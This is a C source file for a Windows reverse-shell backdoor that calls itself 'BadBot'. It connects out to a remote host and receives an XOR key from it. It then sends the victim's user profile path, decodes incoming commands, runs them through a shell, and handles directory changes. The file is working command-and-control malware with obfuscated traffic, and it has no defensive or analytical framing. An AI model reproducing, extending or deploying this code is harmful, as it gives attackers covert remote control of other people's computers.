#include "./includes/socket.h"
#include "./includes/shell.h"
#include "./includes/util.h"

#include <unistd.h>

#ifdef DEBUG
#include <stdio.h>
#endif


// Globals
int XorKey = 0;

// Reads from Socket and returns XOR Key
static int getKey(SOCKET sock)
{
    char key;

    // Read the information being sent
    if (recv(sock, &key, 1, 0) <= 0)
        return 0;

    return (int)key;
}

int readLoop(SOCKET winsock)
{
    // Buffer where the user's commands are being sent to
    char buf[1000] = {0};
    char *windowsUser = getenv("USERPROFILE");

    int resp_len; // Amount of bytes written back from the socket

    // Add Windows User into Buffer
    strncpy(buf, windowsUser, strlen(windowsUser));

    write_xor(buf, winsock, XorKey);

    while (1)
    {
        // Set Memory to zero
        memset(buf, 0, strlen(buf));

        if ((resp_len = recv(winsock, buf, sizeof(buf), 0)) <= 0)
            break;

        xorbytes(buf, strlen(buf), XorKey); // Make Data Readable

#ifdef DEBUG
        printf("[BadBot] Recieved Command: [%s]\n", buf);
#endif

        // Checking if change directory was sent over socket
        if ((resp_len > 2) && (!strncmp(buf, "cd", 2)))
        {
            chdir((char *)buf + 3); // removing the first three characters and getting the path of where the admin wants to change directory
            continue;
        } else if (terminal(buf, winsock) == SocketClose)
            break;
    }

    return 0;
}

// Creates the Socket
SOCKET establishConnection(char *host, int port)
{
    // After connect function, it will return the WSAAPI, which is the socket file
    SOCKET winSock;

    // Create Socket
    winSock = socket(AF_INET, SOCK_STREAM, 0);

    if (winSock == INVALID_SOCKET)
        return INVALID_SOCKET;

    // Socket Server Structure
    struct sockaddr_in servAddr = {0};

    servAddr.sin_port = htons(port);
    servAddr.sin_family = AF_INET;
    servAddr.sin_addr.S_un.S_addr = inet_addr(host);

    if (connect(winSock, (const struct sockaddr *)&servAddr, sizeof(servAddr)) == SOCKET_ERROR)
        return -1;

    XorKey = getKey(winSock);

#ifdef DEBUG
    printf("[BadBot] XOR Key Received: %d\n", XorKey);
#endif

    return winSock;
}
